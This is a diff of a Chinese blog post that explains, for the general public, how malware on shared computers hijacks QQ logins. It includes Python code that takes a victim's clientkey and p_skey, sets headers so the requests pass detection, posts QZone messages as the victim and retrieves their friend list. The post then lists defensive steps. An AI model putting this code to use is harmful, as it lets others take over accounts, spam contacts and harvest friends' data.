-    login_url = <span class="string">"https://ssl.ptlogin2.qq.com/jump?clientuin={}&amp;"</span> \
-                <span class="string">"keyindex=9&amp;"</span> \
-                <span class="string">"pt_aid=549000912&amp;"</span> \
-                <span class="string">"daid=5&amp;"</span> \
-                <span class="string">"u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;"</span> \
-                <span class="string">"pt_local_tk={}&amp;"</span> \
-                <span class="string">"pt_3rd_aid=0&amp;"</span> \
-                <span class="string">"ptopt=1&amp;style=40"</span>.format(account, pt_local_token)
+    # 获取远程登录凭证
+    # 其中u1为QQ空间地址（抓包可获得）
+    login_url = &quot;https://ssl.ptlogin2.qq.com/jump?clientuin={}&amp;&quot; \
+                &quot;keyindex=9&amp;&quot; \
+                &quot;pt_aid=549000912&amp;&quot; \
+                &quot;daid=5&amp;&quot; \
+                &quot;u1=https%3A%2F%2Fqzs.qzone.qq.com%2Fqzone%2Fv5%2Floginsucc.html%3Fpara%3Dizone&amp;&quot; \
+                &quot;pt_local_tk={}&amp;&quot; \
+                &quot;pt_3rd_aid=0&amp;&quot; \
+                &quot;ptopt=1&amp;style=40&quot;.format(account, pt_local_token)
 
-    <span class="comment"># 按照抓包获得的请求照样地设置了一下Referer 免得有检测</span>
-    login_session.headers[<span class="string">'Referer'</span>] = get_local_token_url
+    # 按照抓包获得的请求照样地设置了一下Referer 免得有检测
+    login_session.headers[&#39;Referer&#39;] = get_local_token_url
     res = login_session.get(login_url)
-    <span class="comment"># 至此获取凭证(clientkey)成功,下面获取p_skey</span>
+    # 至此获取凭证(clientkey)成功,下面获取p_skey
 
-    <span class="comment"># 到此处会有个check操作，需要GET去请求验证一下上一个请求响应内容给的地址</span>
-    <span class="comment"># ============================================ 获取p_skey ===================================================</span>
-    zone_login_check_url = <span class="keyword">None</span>
-    <span class="keyword">try</span>:
-        <span class="comment"># 获取认证地址及参数</span>
-        zone_login_check_url = re.findall(<span class="string">"'(http.*?)'"</span>, res.text)[<span class="number">0</span>]
-    <span class="keyword">except</span> IndexError:
-        print(<span class="string">'Fail to get login token .'</span>)
-        exit(<span class="number">0</span>)
-    <span class="comment"># 发起认证请求</span>
+    # 到此处会有个check操作，需要GET去请求验证一下上一个请求响应内容给的地址
+    # ============================================ 获取p_skey ===================================================
+    zone_login_check_url = None
+    try:
+        # 获取认证地址及参数
+        zone_login_check_url = re.findall(&quot;&#39;(http.*?)&#39;&quot;, res.text)[0]
+    except IndexError:
+        print(&#39;Fail to get login token .&#39;)
+        exit(0)
+    # 发起认证请求
     res = login_session.get(zone_login_check_url)
-    <span class="comment"># 一样的补一下Referer和UA</span>
-    login_session.headers[<span class="string">'Referer'</span>] = <span class="string">"https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone"</span>
+    # 一样的补一下Referer和UA
+    login_session.headers[&#39;Referer&#39;] = &quot;https://qzs.qzone.qq.com/qzone/v5/loginsucc.html?para=izone&quot;
     login_session.headers[
-        <span class="string">'User-Agent'</span>] = <span class="string">"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36"</span>
-    <span class="comment"># 请求对应账号的空间，获取发送说说必要参数——qzone_token(响应的JS里面获取)以及p_skey(cookie中获取)</span>
-    res = login_session.get(<span class="string">"https://user.qzone.qq.com/{}"</span>.format(account))
+        &#39;User-Agent&#39;] = &quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36&quot;
+    # 请求对应账号的空间，获取发送说说必要参数——qzone_token(响应的JS里面获取)以及p_skey(cookie中获取)
+    res = login_session.get(&quot;https://user.qzone.qq.com/{}&quot;.format(account))
 
-    <span class="comment"># 获取必要参数p_skey用来计算CSRFToken</span>
-    p_skey = login_session.cookies.get(<span class="string">"p_skey"</span>)
-    g_tk = getACSRFToken(p_skey)  <span class="comment"># 计算CSRFToken</span>
-    <span class="comment"># 从响应的页面JS中获取qzone_token</span>
-    res.encoding = <span class="string">'utf-8'</span>
-    qzone_token = re.findall(<span class="string">'window.g_qzonetoken = \(function\(\){ try\{return "([0-9a-fA-F]+?)";\}'</span>, res.text)[<span class="number">0</span>]
+    # 获取必要参数p_skey用来计算CSRFToken
+    p_skey = login_session.cookies.get(&quot;p_skey&quot;)
+    g_tk = getACSRFToken(p_skey)  # 计算CSRFToken
+    # 从响应的页面JS中获取qzone_token
+    res.encoding = &#39;utf-8&#39;
+    qzone_token = re.findall(&#39;window.g_qzonetoken = \(function\(\){ try\{return &quot;([0-9a-fA-F]+?)&quot;;\}&#39;, res.text)[0]
 
-    <span class="comment"># 发送说说的地址（抓包可得），并传入刚才获取的qzone_token以及g_tk</span>
-    post_comment_url = <span class="string">"https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?"</span> \
-                       <span class="string">"qzonetoken={}&amp;g_tk={}"</span>.format(qzone_token, g_tk)
-    <span class="comment"># 补一下Content-Type</span>
-    login_session.headers[<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span>
-    <span class="comment"># 发送说说的必要参数（抓包可得），其中con字段及说说内容</span>
-    param = {<span class="string">"syn_tweet_verson"</span>: <span class="string">"1"</span>, <span class="string">"paramstr"</span>: <span class="string">"1"</span>, <span class="string">"pic_template"</span>: <span class="string">""</span>, <span class="string">"richtype"</span>: <span class="string">""</span>, <span class="string">"richval"</span>: <span class="string">""</span>,
-             <span class="string">"special_url"</span>: <span class="string">""</span>, <span class="string">"subrichtype"</span>: <span class="string">""</span>, <span class="string">"who"</span>: <span class="string">"1"</span>, <span class="string">"con"</span>: Message, <span class="string">"feedversion"</span>: <span class="string">"1"</span>,
-             <span class="string">"ver"</span>: <span class="string">"1"</span>, <span class="string">"ugc_right"</span>: <span class="string">"1"</span>, <span class="string">"to_sign"</span>: <span class="string">"0"</span>, <span class="string">"hostuin"</span>: <span class="string">"&lt;Your QQ number&gt;"</span>, <span class="string">"code_version"</span>: <span class="string">"1"</span>, <span class="string">"format"</span>: <span class="string">"fs"</span>,
-             <span class="string">"qzreferrer"</span>: <span class="string">"https%3A%2F%2Fuser.qzone.qq.com%2F&lt;Your QQ number&gt;"</span>}
-    <span class="comment"># 发送说说</span>
+    # 发送说说的地址（抓包可得），并传入刚才获取的qzone_token以及g_tk
+    post_comment_url = &quot;https://user.qzone.qq.com/proxy/domain/taotao.qzone.qq.com/cgi-bin/emotion_cgi_publish_v6?&quot; \
+                       &quot;qzonetoken={}&amp;g_tk={}&quot;.format(qzone_token, g_tk)
+    # 补一下Content-Type
+    login_session.headers[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+    # 发送说说的必要参数（抓包可得），其中con字段及说说内容
+    param = {&quot;syn_tweet_verson&quot;: &quot;1&quot;, &quot;paramstr&quot;: &quot;1&quot;, &quot;pic_template&quot;: &quot;&quot;, &quot;richtype&quot;: &quot;&quot;, &quot;richval&quot;: &quot;&quot;,
+             &quot;special_url&quot;: &quot;&quot;, &quot;subrichtype&quot;: &quot;&quot;, &quot;who&quot;: &quot;1&quot;, &quot;con&quot;: Message, &quot;feedversion&quot;: &quot;1&quot;,
+             &quot;ver&quot;: &quot;1&quot;, &quot;ugc_right&quot;: &quot;1&quot;, &quot;to_sign&quot;: &quot;0&quot;, &quot;hostuin&quot;: &quot;&lt;Your QQ number&gt;&quot;, &quot;code_version&quot;: &quot;1&quot;, &quot;format&quot;: &quot;fs&quot;,
+             &quot;qzreferrer&quot;: &quot;https%3A%2F%2Fuser.qzone.qq.com%2F&lt;Your QQ number&gt;&quot;}
+    # 发送说说
     res = login_session.post(post_comment_url, data=param)
-    <span class="keyword">if</span> res.status_code == <span class="number">200</span>:
-        print(<span class="string">"[+] Account {} send message successfully."</span>.format(account))
+    if res.status_code == 200:
+        print(&quot;[+] Account {} send message successfully.&quot;.format(account))
 
-    <span class="comment"># ================================================= 获取好友列表 =====================================================</span>
-    <span class="comment"># 接口地址</span>
-    get_friends_url = <span class="string">"https://h5.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?"</span> \
-                      <span class="string">"uin={}&amp;follow_flag=1&amp;"</span> \
-                      <span class="string">"groupface_flag=0&amp;fupdate=1&amp;"</span> \
-                      <span class="string">"g_tk={}"</span>.format(account, g_tk)
+    # ================================================= 获取好友列表 =====================================================
+    # 接口地址
+    get_friends_url = &quot;https://h5.qzone.qq.com/proxy/domain/r.qzone.qq.com/cgi-bin/tfriend/friend_show_qqfriends.cgi?&quot; \
+                      &quot;uin={}&amp;follow_flag=1&amp;&quot; \
+                      &quot;groupface_flag=0&amp;fupdate=1&amp;&quot; \
+                      &quot;g_tk={}&quot;.format(account, g_tk)
     res = login_session.get(get_friends_url)
-    print(<span class="string">"QQ friends info."</span>)
+    print(&quot;QQ friends info.&quot;)
     print(res.text)
-
-
 </code></pre>
-<h2 id="写在最后"><a class="markdownIt-Anchor" href="#写在最后"></a> 写在最后</h2>
-<p>这一些接口其实我们都很熟悉Web页面的快捷登录，这一些操作就是模拟了浏览器或者说软件强制代替你进行了快捷登录。注意是运行在本地上的任何软件都可以做到这个目的。所以账号密码并没有被盗取，而是被一些恶意的软件盗取的登录凭证，代替你发送了垃圾信息。当然我没有讨论如何绕过网吧的还原机制，这又是另一码事了。<br>
-一些图谋不轨的人就将这些接口凑起来，写个软件种在网吧等公共上网设施，等待上Q的人帮他进行一些黑产行为，如在QQ群，空间里面发博彩、色情信息以及广告，进行牟利。这些技术并不复杂，很多初中甚至小学文化的“大黑阔”都可以写出来。</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>这一些接口其实我们都很熟悉Web页面的快捷登录，这一些操作就是模拟了浏览器或者说软件强制代替你进行了快捷登录。注意是运行在本地上的任何软件都可以做到这个目的。所以账号密码并没有被盗取，而是被一些恶意的软件盗取的登录凭证，代替你发送了垃圾信息。当然我没有讨论如何绕过网吧的还原机制，这又是另一码事了。<br>一些图谋不轨的人就将这些接口凑起来，写个软件种在网吧等公共上网设施，等待上Q的人帮他进行一些黑产行为，如在QQ群，空间里面发博彩、色情信息以及广告，进行牟利。这些技术并不复杂，很多初中甚至小学文化的“大黑阔”都可以写出来。</p>
 <p>对于其他非计算机行业的人，很多都可能遭遇过这类情况，但又无从知晓，也渐渐地神秘化了这帮人。</p>
 <p>写此一文也权当是一个科普，希望对读者有所收获。</p>
 <p>防范措施：</p>
@@ -520,7 +486,7 @@ print(<span class="string">"====================================================
 <li>若发现自己账号异常，开始乱发东西时，第一时间修改密码会导致“大黑阔”获取的cookie瞬间失效，可以立即停止发送垃圾信息</li>
 <li>然后就可以进行删除说说，发群道歉或者像我这样写一篇文章进行面子的最后补救了</li>
 </ol>
-<p>最后祝你生活愉快，大黑阔 😃</p>
+<p>最后祝你生活愉快，大黑阔 :)</p>
 
         </div>
 
@@ -593,20 +559,5 @@ print(<span class="string">"====================================================
 <script>hljs.highlightAll();</script>
 
     </div>
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
